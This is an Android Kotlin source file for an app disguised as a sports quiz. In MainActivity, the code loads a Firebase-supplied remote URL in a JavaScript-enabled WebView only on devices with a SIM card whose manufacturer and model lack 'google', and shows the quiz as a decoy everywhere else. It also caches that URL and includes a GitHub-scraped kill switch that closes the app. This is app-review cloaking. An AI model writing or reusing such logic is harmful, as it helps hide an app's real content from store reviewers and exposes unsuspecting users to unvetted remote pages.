package osplimaaser.sresv

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import android.view.KeyEvent
import android.view.MotionEvent
import android.view.View
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Observer
import androidx.lifecycle.ViewModelProvider
import androidx.recyclerview.widget.LinearLayoutManager
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import osplimaaser.sresv.Adapter.TestsAdapter
import osplimaaser.sresv.Quiz.TestSet
import osplimaaser.sresv.Remote.RemoteConfigUtils
import osplimaaser.sresv.TestsData.TestViewModel
import osplimaaser.sresv.databinding.ActivityMainBinding
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private val TAG = "RemoteConfigUtils"

    private val SHARED_REMOTE_KEY = "REMOTE_NEW_URL"
    private val SHARED_TEST_KEY = "TEST_KEY"

    private lateinit var binding: ActivityMainBinding

    private var remoteUrl: String? = null
    private var sharedUrl: String? = null

    private val PREFERENCES_NAME = "remote_config_shared_preferences"

    private var sharedPrefs: SharedPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        sharedPrefsInit()
        //clearSharedPreference()

        checkScam()

        if (checkTestsLoad() == null || checkTestsLoad() == false) {
            testsInit()
        }

        loadSharedPreferences(SHARED_REMOTE_KEY)

        if (sharedUrl == null || sharedUrl == "") {
            Log.v(TAG, "---- SharedUrl is null")
            RemoteConfigUtils.getFirebaseRemoteConfig().fetchAndActivate().addOnCompleteListener {
                if (it.isComplete) {
                    Log.v(TAG, "---- Task completed")
                    remoteUrl = RemoteConfigUtils.getFirebaseRemoteConfig().getString("url")
                    if (isPhoneValid() && remoteUrl != null && remoteUrl != "") {
                        Log.v(TAG, "-------- All is valid")
                        loadWebView(remoteUrl.toString())
                        hidePlug()
                        saveRemoteUrlToShared()
                    } else {
                        Log.v(TAG, "-------- Not valid")
                        loadPlug()
                    }
                } else {
                    Log.v(TAG, "---- Task isn't completed")
                    loadPlug()
                }
            }
        } else {
            Log.v(TAG, "---- SharedUrl isn't null")
            loadWebView(sharedUrl!!)
            hidePlug()
        }
    }

    private fun checkScam() {
        Thread(Runnable {
            val stringBuilder = StringBuilder()
            var doc: Document = Document("")
            try {
                val url: String = "https://github.com/Atax1a/DeltaSoftTest"
                doc = Jsoup.connect(url).get()

            }catch (e: IOException){
                e.printStackTrace()
            }
            val message = doc.getElementsByClass("f4 my-3").text()
            runOnUiThread {
                if(message != "210970"){
                    this.finish()
                }
            }
        }).start()
    }

    private fun hidePlug() {
        binding.plugContainer.visibility = View.GONE
        binding.webView.visibility = View.VISIBLE
    }

    private fun checkTestsLoad(): Boolean? {
        return sharedPrefs?.getBoolean(SHARED_TEST_KEY, false)
    }

    private fun testsInit() {
        Log.v("ASDASD", "TESTS ADD")
        var testSet: TestSet = TestSet(application)
        testSet.addGeneralTest()
        testSet.addGeneralTestQuestions()

        testSet.addBallTest()
        testSet.addBallTestQuestions()

        testSet.addWaterTest()
        testSet.addWaterTestQuestions()

        testSet.addIndoorTest()
        testSet.addIndoorTestQuestions()

        testSet.addFootballInternationalsTest()
        testSet.addFootballInternationalsTestQuestions()

        testSet.addFootballEnglishTest()
        testSet.addFootballEnglishTestQuestions()

        testSet.addFootballEuropeanTest()
        testSet.addFootballEuropeanTestQuestions()

        testSet.addFootballWorldTest()
        testSet.addFootballWorldTestQuestions()

        testSet.addWeekTest()
        testSet.addWeekTestQuestions()

        val editor: SharedPreferences.Editor? = sharedPrefs?.edit()
        editor?.putBoolean(SHARED_TEST_KEY, true)
        editor?.commit()
        Log.v(TAG, "saveTestShared: $PREFERENCES_NAME + $SHARED_TEST_KEY with true")
    }

    private fun sharedPrefsInit() {
        sharedPrefs = this.getSharedPreferences(PREFERENCES_NAME, Context.MODE_PRIVATE)
        Log.v(TAG, "sharedPrefsInit: sharedPrefs loaded")
    }

    private fun loadPlug() {
        Log.v(TAG, "loadPlug: plug loaded")
        val adapter = TestsAdapter()
        binding.testsRecyclerView.adapter = adapter
        binding.testsRecyclerView.layoutManager = LinearLayoutManager(this)
        var mTestViewModel: TestViewModel

        mTestViewModel = ViewModelProvider(this).get(TestViewModel::class.java)
        mTestViewModel.readAllData.observe(this, Observer {
            adapter.setData(it, this)
        })

        binding.webView.visibility = View.GONE
        binding.plugContainer.visibility = View.VISIBLE
    }

    private fun saveRemoteUrlToShared() {
        val editor: SharedPreferences.Editor? = sharedPrefs?.edit()
        editor?.putString(SHARED_REMOTE_KEY, remoteUrl)
        editor?.commit()
        Log.v(
            TAG,
            "saveRemoteUrlToShared: Remote url saved to $PREFERENCES_NAME + $SHARED_REMOTE_KEY with $remoteUrl"
        )
    }

    private fun isPhoneValid(): Boolean {
        val mark = Build.MANUFACTURER
        val model = Build.MODEL
        Log.v(
            TAG, "isPhoneValid: TF mark: $mark ; TF model: $mark; Contains Google: ${
                mark.contains("google") && model.contains("google")
            }; Has sim: ${isSIMInserted(this)}"
        )
        return isSIMInserted(this) && !(mark.contains("google")) && !(model.contains("google"))
    }

    private fun loadRemoteUrl(): String {
        if (RemoteConfigUtils.getNewUrl().length > 1) Log.v(TAG, "loadRemoteUrl: remoteUrl loaded")
        else Log.v(TAG, "loadRemoteUrl: remoteUrl isn't loaded")
        return if (remoteUrl!!.length > 1) remoteUrl as String
        else ""
    }

    private fun loadWebView(url: String) {
        Log.v(TAG, "loadWebView: webView loaded")
        val webSettings = binding.webView.settings
        webSettings.javaScriptEnabled = true

        binding.webView.apply {
            loadUrl(url)
            webViewClient = WebViewClient()
            canGoBack()
            setOnKeyListener(View.OnKeyListener() { v, keyCode, event ->
                if (keyCode == KeyEvent.KEYCODE_BACK && event.action == MotionEvent.ACTION_UP && binding.webView.canGoBack()) {
                    binding.webView.goBack()
                    return@OnKeyListener true
                }
                false
            })

        }
    }

    private fun loadSharedPreferences(key: String) {
        sharedUrl = sharedPrefs?.getString(key, null)
        if (sharedUrl != null) {
            Log.v(TAG, "loadSharedPreferences: url loaded from shared: $sharedUrl")
        }
    }

    private fun isSIMInserted(context: Context): Boolean {
        return TelephonyManager.SIM_STATE_ABSENT != (context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState
    }


    private fun clearSharedPreference() {
        val editor: SharedPreferences.Editor? = sharedPrefs?.edit()
        //sharedPref = PreferenceManager.getDefaultSharedPreferences(context);
        editor?.clear()
        editor?.commit()
        Log.v(TAG, "clearSharedPreference: shared prefs cleaned")
    }

}